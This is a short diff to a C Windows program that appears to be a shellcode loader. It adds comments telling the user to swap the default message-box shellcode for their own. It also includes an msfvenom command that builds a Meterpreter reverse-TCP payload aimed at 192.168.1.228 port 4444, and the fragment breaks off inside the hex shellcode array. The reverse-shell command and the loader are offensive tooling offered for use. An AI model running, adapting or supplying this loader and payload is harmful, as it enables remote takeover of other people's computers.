@@ -2,7 +2,11 @@
 #include <Windows.h>
 
 int main(void) {
+	// You can generate a shellcode using msfvenom
+	// msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.228 lport=4444 -f c
 
+	// This default shellcode pop up a message box
+	// Change the shellcode variable to your shell code
 	char shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
 						"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
 						"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
